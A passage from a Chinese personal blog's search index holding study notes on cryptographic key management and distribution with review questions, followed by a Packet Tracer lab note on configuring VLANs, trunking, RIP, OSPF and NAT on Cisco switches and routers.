密的，比如可以对数据恢复进行严格的时间限制。这些保护措施提 供了KEC传送密钥时所要求的限制，而且认证机构也可以防止DRC 用密钥产生伪消息。</p><h3 id="3-3-密钥分配方案"><a href="#3-3-密钥分配方案" class="headerlink" title="3.3 密钥分配方案"></a>3.3 密钥分配方案</h3><h4 id="3-3-1分配依据"><a href="#3-3-1分配依据" class="headerlink" title="3.3.1分配依据"></a>3.3.1分配依据</h4><ol><li><p>减轻负担，提高效率——（自动密钥分配机制）</p></li><li><p>提高安全性——减少系统中驻留的密钥量</p></li></ol><h4 id="3-3-2常用密钥分配技术"><a href="#3-3-2常用密钥分配技术" class="headerlink" title="3.3.2常用密钥分配技术"></a>3.3.2常用密钥分配技术</h4><ol><li><p>静态分配技术</p><p>静态分配技术是一种由中心以离线方式预分配的技术，是“面对面”的分发，如到银行领取信用卡密钥，它具有安全性 好的特点，是长期沿用的传统密钥管理技术，不过，它必须 解决密钥的存储技术，静态分发只能以集中式机制存在。</p></li><li><p>动态分配技术<br>动态分配技术是一种“请求一分发”的在线分发技术，如在网上申请用户密钥，它具有方便、及时的特点，但这种分配 技术需要有专门的协议的支持，动态分配技术可采用有中心 或无中心的机制。</p></li></ol><h4 id="3-3-3-密钥分配体制"><a href="#3-3-3-密钥分配体制" class="headerlink" title="3.3.3 密钥分配体制"></a>3.3.3 密钥分配体制</h4><p><strong>集中式密钥分配体制</strong><br>集中式分配体制是引入一个中心服务器（通常称作密钥分配中<br>心或KDC），在这个体系中，团体中的任何一个实体与中心服务 器共享一个密钥。在这样的系统中，需要存储的密钥数量和团体 的人数量差不多，KDC接受用户的请求，为用户提供安全的密钥 分配服务。它的典型代表是Kerboros协议。</p><p><strong>分布式密钥分配体制</strong><br>分布式分配体制中网络中的主机具有相同的地位，他们之间的 密钥分配取决于他们之间的协商，比较著名的有Diffie-Hellman密 钥交换协议，但Diffie-Hellman密钥交换协议没有提供鉴别机制，不能抵抗中间人攻击。</p><h4 id="3-3-4密钥分配的基本方法"><a href="#3-3-4密钥分配的基本方法" class="headerlink" title="3.3.4密钥分配的基本方法"></a>3.3.4密钥分配的基本方法</h4><p>对于通信双方A和B，密钥分配可以有以下几种方法：<br><strong>1</strong> 密钥由A选定，然后通过物理方法安全地传递给B。<br><strong>2</strong> 密钥由可信赖的第三方C选取并通过物理方法安全地发送给A 和B。<br><strong>3</strong> 如果A和B事先已有一密钥，那么其中一方选取新密钥后，用已有的密钥加密新密钥发送给另一方。<br><strong>4</strong> 如果A和B都有一个到可信赖的第三方C的保密信道，那么C就可以为A和B选取密钥后安全地发送给A和B。<br><strong>5</strong> 如果A和B都在可信赖的第三方C发布自己的公开密钥，那么 他们用彼此的公开密钥进行保密通信。</p><h4 id="3-3-5对称密码技术的密钥分配方案"><a href="#3-3-5对称密码技术的密钥分配方案" class="headerlink" title="3.3.5对称密码技术的密钥分配方案"></a>3.3.5对称密码技术的密钥分配方案</h4><p>ANSI X9.17定义了三层密钥层次结构：<br>1）主密钥（KKMs），通过手工分配；</p><p>2）密钥加密密钥（KKs），通过在线分配；</p><p>3）数据密钥（KDs）。</p><h5 id="对称密码技术的密钥分配方案："><a href="#对称密码技术的密钥分配方案：" class="headerlink" title="对称密码技术的密钥分配方案："></a>对称密码技术的密钥分配方案：</h5><p>（1）集中式密钥分配方案</p><p><img src="https://s2.loli.net/2024/11/03/8WwL9POfmzdjFDl.jpg" alt="10.jpg"></p><p>（2）分布式密钥分配方案</p><p>  分布式密钥分配方案是指网络通信中各个通信方具有相同的地位，它们之间的密钥分配取决于它们之间的协商，不受何其 他方的限制。这种密钥分配方案要求有n个通信方的网络需要 保存[n(n-1)&#x2F;2]个主密钥，对于较大型的网络，这种方案是不适用的，但是在<span style = "color: blue;">一个小型网络或一个大型网络的局部范围</span>内，这种方案还是有用的。</p><p><img src="https://s2.loli.net/2024/11/03/4TE9Yca6JqM8vNL.jpg" alt="11.jpg"></p><h4 id="3-3-6非对称密码技术的密钥分配方案"><a href="#3-3-6非对称密码技术的密钥分配方案" class="headerlink" title="3.3.6非对称密码技术的密钥分配方案"></a>3.3.6非对称密码技术的密钥分配方案</h4><h4 id="1-公钥的分配："><a href="#1-公钥的分配：" class="headerlink" title="(1)公钥的分配："></a><strong>(1)公钥的分配：</strong></h4><ol><li><p><strong>分开发布</strong></p><p> 公开发布:是指用户将自己的公钥发送给另外一个参与 者，或者把公钥广播给相关人群。</p><p>这种方法有一个非常大的缺 点:任何人都可以伪造一个公钥冒充他人。</p></li><li><p><strong>公用目录</strong><br> 由一个可信任的系统或组织建立和管理维护公用目录，该公用目录维持一个公开动态目录。公用目录为每个参与者维护一 个目录项{标识符，公钥}，每个目录项的信息必须进行安全认 证。<strong>任何人</strong>都可以从这里获得需要保密通信的公钥。与公开发布公钥相比，这种方法的安全性高一些。</p><p>但也有一个致命的弱点， 如果攻击者成功地得到目录管理机构的私钥，就可以伪造公钥， 并发送给给其他人达到欺骗的目的</p></li><li><p><strong>公钥机构</strong></p></li></ol><p>​ 为更严格控制公钥从目录分配出去的公钥更加安全，为此需 要引入一个公钥管理机构<strong>来为各个用户建立、维护和控制动态的公用目录</strong>。与单纯的公用目录相比，该方法的安全性更高。但这 种方式也有它的缺点:由于每个用户要想和其他人通信都需求助 于公钥管理机构，因而管理机构可能会成为系统的瓶颈，而且由 管理机构维护的公用目录也容易被攻击者攻击。</p><ol start="4"><li><strong>公钥证书</strong></li></ol><p>  在不与公钥管理机构通信，又能证明其他通信方的公钥的可信度，实际上完全解决了公开发布及公用目录的安全问题。</p><p>采 用公钥证书是为了解决公开密钥管理机构的瓶颈问题。<br>公钥证书即数字证书是由授权中心CA(Certificate Authority)颁发的。</p><p><strong>证书的形式为CA&#x3D;ESKCA[T，IDA， PKA]，其中IDA是用户A的身份标识符，PKA是A的公钥，T是 当前时间戳，SKCA是CA的私钥。</strong></p><p>ps:公钥证书的发放过程：</p><p><img src="https://s2.loli.net/2024/11/05/cfoI9pu7gF6Cvhe.jpg" alt="12.jpg"></p><h4 id="2-利用非对称密码技术进行对称密码技术密钥的分配"><a href="#2-利用非对称密码技术进行对称密码技术密钥的分配" class="headerlink" title="(2)利用非对称密码技术进行对称密码技术密钥的分配:"></a>(2)利用非对称密码技术进行对称密码技术密钥的分配:</h4><ol><li><span style="color :blue;">简单分配:</span></li></ol><p>下图就是用 <strong>非对称密码技术建立会话密钥</strong> 的过程。</p><p><img src="https://s2.loli.net/2024/11/05/p32OPtFx451XISa.jpg" alt="13.jpg"></p><p>但这一分配方案容易 遭到主动攻击，假如攻击者已 经接入A和B双方的通信信 道，可以轻易地截获A、B双 方的通信。</p><ol start="2"><li><p><span style="color :blue;">具有保密和认证功能的密钥分配:</span></p><p>针对简单分配密钥的缺点，人们又设计了<strong>具有保密和认证功能的非对称密码技术的密钥分配</strong>，如下图所示。</p><p><img src="https://s2.loli.net/2024/11/05/mxbtqU9RHKOZNVg.jpg" alt="14.jpg"></p><p>密钥分配过程既具有保密性，又具有认证性，因此既可以防止被动攻击，也可以防止主动攻击。</p></li></ol><h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><p>1.请分析网络信息安全非常重要的原因。</p><p>2.请说明网络信息安全的内涵、特征及网络信息安全问题的原因。</p><p>3.请说明网络信息安全的目标和功能是什么。</p><p>4.请说明信息安全技术需求和安全策略。</p><p>5.请说明信息安全与区块链安全的区别和联系。</p><p>6.请说明近几年国内出台了哪些网络相关法律，这些法律的出台有什么重要意义。</p><ol><li><p>比较对称密码算法和非对称密码算法的优缺点，考虑在异地的两个人如何通过不可信的网络信道传输信息？</p></li><li><p>两个交易者A和B，假设B没有A的电话或邮箱的前提下，B如何相信A在网上发布的公钥就是真真的A发布的公钥，而不是C假冒A发布的？</p></li><li><p>请说明密码学在信息安全领域有哪些作用。</p></li><li><p>请说明密码系统的组成及它们之间的关系。</p></li><li><p>请说明如何认识密码系统的安全性。</p></li><li><p>请说明密码分析者对密码技术的攻击方式有哪些，并简要说明？</p></li><li><p>给定DES算法，在平均意义下，有多少个密钥可以把一个指定的输入分组加密得到一个指定的输出分组？</p></li><li><p>什么是非对称加密？和对称加密的区别？它的工作原理是什么？</p></li><li><p>利用 ab mod n&#x3D;((a mod n)(b mod n)) mod n,能把35^77 mod<br>83所需的76次乘法运算化简到11次吗，还可以进一步化简吗。</p></li><li><p>选择两个素数p &#x3D; 7和 q &#x3D; 11。计算n 和 φ（n）；选择公钥指数e&#x3D;17。计算私钥指数d；加密明文消息m&#x3D;5，计算密文。</p></li><li><p>为什么要引进密钥管理技术？</p></li><li><p>密钥管理系统涉及到密钥管理的哪些方面？</p></li><li><p>什么是密钥托管？</p></li><li><p>简述分布式密钥分配方案的过程。</p></li><li><p>简述集中式密钥分配方案的过程，并分析可能存在的潜在威胁。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【学习笔记】简单网络结构的搭建/vlan配置</title>
      <link href="/2024/10/23/vlan%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/10/23/vlan%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>(重新粗糙存档一下，过程图基本都丢失了，仅用于个人学习笔记使用)</p><ol><li>网络基础架构图</li><li>网络通信的原理</li><li>软件的使用</li></ol><p>​       a. 关于拓扑图： 接入层交换机，汇聚层交换机</p><p>​        b.技术实现6要求</p><h3 id="Vlan-trunk-不同vlan间的通信（三层交换技术）"><a href="#Vlan-trunk-不同vlan间的通信（三层交换技术）" class="headerlink" title="Vlan trunk 不同vlan间的通信（三层交换技术）"></a>Vlan trunk 不同vlan间的通信（三层交换技术）</h3><h4 id="交换机的基础命令-知识："><a href="#交换机的基础命令-知识：" class="headerlink" title="交换机的基础命令&#x2F;知识："></a>交换机的基础命令&#x2F;知识：</h4><ol><li><p>vlan: 虚拟局域网</p></li><li><p>vlan trunk stp 链路聚合</p></li><li><p>hsrp(vrrp)——公司内部的网络系统</p></li><li><p>将pc1和pc2放入不同vlan可以实现隔离</p><p>(同一虚拟网之间的电脑可以通信，不同的不可通信)</p></li><li><p>vlan范围： 1-4094</p></li><li><p><strong>关于常见接口类型：</strong></p></li></ol><p>​交换机常见接口类型：有Access和trunk</p><p>​Access用来接入终端，电脑，打印机，服务器</p><p>​trunk用在交换机与交换机之间</p><p>​trunk技术解决交换机之间传输vlan数据的问题</p><ol start="7"><li>命令行敲错后，跳出卡顿：ctrl+shift+1</li></ol><ul><li><p>三种模式：</p><ol><li><p>Enable </p></li><li><p>#</p></li><li><p>Config</p></li></ol></li><li><p>Exit 退出</p></li><li><p>查看都在#模式中；</p></li><li><p>配置文件的查看：<code>show run (running-config)</code></p></li><li><p>查看交换机的所有接口：<code>show IP interface brief</code></p></li><li><p>查看vlan：<code>show vlan</code></p></li><li><p>批量建立vlan两种办法: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vlan batch 1 to 30</span><br><span class="line"></span><br><span class="line">vlan batch 1 3 5 7 9</span><br></pre></td></tr></table></figure></li><li><p>默认情况下交换机所有端口都在：<code>vlan1</code> (1003-1005为特殊接口)（端口默认用在同一vlan中）</p></li><li><p>修改配置文件（配置在config）：</p></li><li><p>删除操作： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no switch mode access</span><br></pre></td></tr></table></figure></li><li><p>删除vlan: <code>Switch(config)#no vlan x</code></p></li><li><p>文件的保存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch#write</span><br><span class="line">Building configuration...</span><br></pre></td></tr></table></figure></li><li><p>重启命令：<code>reload</code></p></li><li><p>Ping网络：计算机 &gt; conmand prompt</p><p>（可通过ping另一pc的地址可以查看是否通路）</p></li><li><p>Trunk技术：承载不同的vlan，一般配置在交换机与交换机之间相连的端口</p></li><li><p>还原：先<code>show run</code>，然后复制文本到别处编辑（添加no），再粘贴回去</p><p>（show run也可用于检查）</p></li></ul><h5 id="关于汇聚层步骤的补充："><a href="#关于汇聚层步骤的补充：" class="headerlink" title="关于汇聚层步骤的补充："></a>关于汇聚层步骤的补充：</h5><ul><li><p><code>Ip addr</code> 的地址不是电脑的地址，是第三行需要输入的交换机的地址</p></li><li><p>当需要同时配置如：<code>f0/1</code> 和 <code>f0/2</code> 两个端口时，输入 <code>interface range f0/1,f0/2</code></p><p>设置网关：</p><p><img src="https://s2.loli.net/2024/10/23/Ln2vrqQdEgyRh1B.png" alt="vlan001.png"></p></li></ul><h5 id="对于服务器接入交换机："><a href="#对于服务器接入交换机：" class="headerlink" title="对于服务器接入交换机："></a>对于服务器接入交换机：</h5><ol><li>创建vlan</li><li>将接计算机的接口加入相应的vlan</li><li>配ip</li><li>ip routing</li></ol><p>展示路由表：<code>Show ip route</code></p><p>路由器中：</p><ol><li>添加模块时记得关电源</li><li>添加NM-4E</li></ol><p>手机：静态路由</p><p>工具：动态路由</p><p>以下三步以下图为例：</p><p><img src="https://s2.loli.net/2024/10/23/yVzjvkOlrdm3q7o.png" alt="vlan002.png"></p><h4 id="1-接入层（3步）"><a href="#1-接入层（3步）" class="headerlink" title="1. 接入层（3步）"></a>1. <strong>接入层（3步）</strong></h4><ol><li><p>创建vlan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config</span><br><span class="line">vlan 10</span><br><span class="line">vlan 20</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li><li><p>接电脑端口加入vlan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface f0/1</span><br><span class="line">switchport mode access</span><br><span class="line">switchport access vlan 10</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">interface f0/2</span><br><span class="line">switchport mode access</span><br><span class="line">switchport access vlan 20</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li><li><p>将连接的端口配trunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">interface f0/3</span><br><span class="line">switchport mode trunk</span><br></pre></td></tr></table></figure></li></ol><h4 id="2-汇聚层（2步）"><a href="#2-汇聚层（2步）" class="headerlink" title="2.  汇聚层（2步）"></a>2.  <strong>汇聚层（2步）</strong></h4><ol><li>点击PC——第二行mask——配置ip地址</li><li>在第三行填交换机地址</li></ol><h4 id="3-核心层（4步）"><a href="#3-核心层（4步）" class="headerlink" title="3. 核心层（4步）"></a>3. <strong>核心层（4步）</strong></h4><p>核心层步骤配置的是计算机的网关</p><ol><li><p>创建vlan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#vlan 10</span><br><span class="line"></span><br><span class="line">Switch(config-vlan)#vlan 20</span><br><span class="line"></span><br><span class="line">Switch(config-vlan)#exit</span><br></pre></td></tr></table></figure></li><li><p>配置trunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#interface f0/1(交换机与交换机之间的端口)</span><br><span class="line"></span><br><span class="line">Switch(config-if)#switchport trunk encapsulation dot1q</span><br><span class="line"></span><br><span class="line">Switch(config-if)#switchport mode trunk</span><br><span class="line"></span><br><span class="line">Switch(config-if)#exit</span><br></pre></td></tr></table></figure></li><li><p>开启三层功能(支持网络层)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#ip routing(开启三层功能，支持路由)</span><br></pre></td></tr></table></figure></li><li><p>配置ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#interface vlan 10</span><br><span class="line"></span><br><span class="line">Switch(config-if)#ip address 192.168.10.1 255.255.255.0（汇聚层步骤中设置的网关地址）</span><br><span class="line"></span><br><span class="line">Switch(config-if)#exit</span><br><span class="line">Switch(config)#interface vlan 20</span><br><span class="line"></span><br><span class="line">Switch(config-if)#ip address 192.168.20.1 255.255.255.0</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2024/10/23/ei9lZtoRkTVnEBP.png" alt="vlan003.png"></p><h2 id="配置内网"><a href="#配置内网" class="headerlink" title="配置内网"></a>配置内网</h2><ol><li><p><code>show ip route</code>查看带C的路</p></li><li><p>用<code>rip</code>加载带C的路(配置在核心交换机上)（config模式用router ip）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">route rip</span><br><span class="line">Network 192.168.10.0</span><br><span class="line">Network 192.168.20.0</span><br><span class="line">Network 192.168.30.0</span><br><span class="line">Network 192.168.40.0</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li><li><p>上网：电脑的dns server要输入dns的网关</p></li></ol><ul><li>三个server-pc分别代表web、ftp、dns</li></ul><ol start="4"><li><p>在ftp中设置用户名和密码</p></li><li><p>在第三台dns中分别在设置前两个名字（name处填）为 <code>www.web.com</code> 和 <code>www.ftp.com</code></p><ul><li>然后分别添加上各自的ip（Address处填）</li><li>配置完点击Add</li></ul><p><img src="https://s2.loli.net/2024/10/23/g7NeGRLuyYsD3Ih.png" alt="vlan004.png"></p></li><li><p>(判断能否上网)</p><ul><li>在pc——desktop——web browser处输入 <code>www.web.com</code>&#x2F;<code>www.ftp.com</code></li></ul></li><li><p>(登入ftp) 在conmand prompt输入如下图操作</p><p><img src="https://s2.loli.net/2024/10/23/VMkpuQftGOzoB62.png" alt="vlan005.png"></p></li></ol><h2 id="配置路由器"><a href="#配置路由器" class="headerlink" title="配置路由器"></a>配置路由器</h2><p>（注意设置显示接口）</p><p><img src="https://s2.loli.net/2024/10/23/e4obi6ECt7fVsI9.png" alt="vlan006.png"></p><ul><li><p>网段即地名</p></li><li><p><code>Ospt</code>只管公网的网段，无需管内网的网段</p><p>通俗讲：</p><ol><li><p>路由器：一般用在公网的；</p></li><li><p>交换机：一般用在内网的；</p></li></ol></li></ul><h5 id="路由器R0"><a href="#路由器R0" class="headerlink" title="路由器R0"></a>路由器R0</h5><ul><li><p>对于<code>f0/1</code>端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#router rip </span><br><span class="line">Switch(config-router)#network 192.168.60.0</span><br></pre></td></tr></table></figure></li><li><p>对于<code>f0/0</code>端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#router rip </span><br><span class="line">Switch(config-router)#network 192.168.70.0</span><br></pre></td></tr></table></figure></li><li><p>对于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  Switch(config)#interface f0/4</span><br><span class="line">  Switch(config-if)#no switchport </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- `Router(config)#interface f0/1`</span><br><span class="line"></span><br><span class="line">  Router(config-if)#no shutdown</span><br><span class="line">  Router(config-if)#ip address 192.168.60.2 255.255.255.0</span><br><span class="line">  </span><br><span class="line">- `Switch(config)#interface f0/7`</span><br><span class="line">  Switch(config-if)#no switchport </span><br><span class="line">  Switch(config-if)#ip address 192.168.70.1 255.255.255.0</span><br><span class="line">- `Router(config)#interface e1/0</span><br><span class="line">  Router(config-if)#no shutdown</span><br><span class="line">  Router(config-if)#ip address 192.168.70.2 255.255.255.0</span><br></pre></td></tr></table></figure></li></ul><h6 id="网络要全通：（路由问题）"><a href="#网络要全通：（路由问题）" class="headerlink" title="网络要全通：（路由问题）"></a>网络要全通：（路由问题）</h6><p>所有三层设备必须要内网的所有网段</p><p>接下来配置外网通</p><p>———————内&#x2F;外网通——————–</p><h4 id="路由器：配置ip-配置路由"><a href="#路由器：配置ip-配置路由" class="headerlink" title="路由器：配置ip 配置路由"></a>路由器：配置ip 配置路由</h4><p>（一下名称参考上图位置，名称不固定）</p><h5 id="R0"><a href="#R0" class="headerlink" title="R0."></a>R0.</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#inter e1/0</span><br><span class="line">Router(config-if)#ip addr 100.100.10.1 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#inter f0/0</span><br><span class="line">Router(config-if)#ip addr 192.168.70.2 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interf f0/1</span><br><span class="line">Router(config-if)#ip addr 192.168.60.2 255.255.255.0</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.10.0  0.0.0.255 area 0</span><br></pre></td></tr></table></figure><h5 id="R1"><a href="#R1" class="headerlink" title="R1:"></a>R1:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#interface f0/0</span><br><span class="line">Router(config-if)#ip address 100.100.10.2 255.255.255.0</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#ip address 100.100.20.1 255.255.255.0</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.10.0 0.0.0.255 area 0</span><br><span class="line">Router(config-router)#network 100.100.20.0 0.0.0.255 area 0</span><br></pre></td></tr></table></figure><h5 id="R2"><a href="#R2" class="headerlink" title="R2:"></a>R2:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#interface f0/0</span><br><span class="line">Router(config-if)#ip address 100.100.20.2 255.255.255.0</span><br><span class="line">Router(config-if)#no shutdown </span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#ip add 100.100.30.1 255.255.255.0</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.20.0  0.0.0.255 area 0</span><br></pre></td></tr></table></figure><p>———————外网互通——————–</p><h3 id="内网上网的问题（内部能够访问公网）——–nat网络地址转换"><a href="#内网上网的问题（内部能够访问公网）——–nat网络地址转换" class="headerlink" title="内网上网的问题（内部能够访问公网）——–nat网络地址转换"></a>内网上网的问题（内部能够访问公网）——–nat网络地址转换</h3><h4 id="第一步-控制内网要上网的网段；（将这些网段连上公网）"><a href="#第一步-控制内网要上网的网段；（将这些网段连上公网）" class="headerlink" title="第一步:控制内网要上网的网段；（将这些网段连上公网）"></a>第一步:控制内网要上网的网段；（将这些网段连上公网）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#access-list 1 permit 192.168.10.0 0.0.0.255</span><br><span class="line">Router(config)#access-list 1 permit 192.168.20.0 0.0.0.255</span><br><span class="line">Router(config)#access-list 1 permit 192.168.30.0 0.0.0.255</span><br></pre></td></tr></table></figure><h4 id="第二步：做NAT转换"><a href="#第二步：做NAT转换" class="headerlink" title="第二步：做NAT转换"></a>第二步：做NAT转换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#ip nat inside source list 1(内网） interface e1/0（公有地址的接口）</span><br></pre></td></tr></table></figure><h4 id="第三步：指定内外网接口"><a href="#第三步：指定内外网接口" class="headerlink" title="第三步：指定内外网接口"></a>第三步：指定内外网接口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#interface f0/0 （内网接口）</span><br><span class="line">Router(config-if)#ip nat inside</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1  （内网接口）</span><br><span class="line">Router(config-if)#ip nat inside</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface e1/0  （公有接口）</span><br><span class="line">Router(config-if)#ip nat outside</span><br></pre></td></tr></table></figure><h5 id="swi0"><a href="#swi0" class="headerlink" title="swi0"></a>swi0</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#ip route 0.0.0.0 0.0.0.0 192.168.70.2</span><br></pre></td></tr></table></figure><h5 id="sw1"><a href="#sw1" class="headerlink" title="sw1"></a>sw1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#ip route 0.0.0.0 0.0.0.0 192.168.60.2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
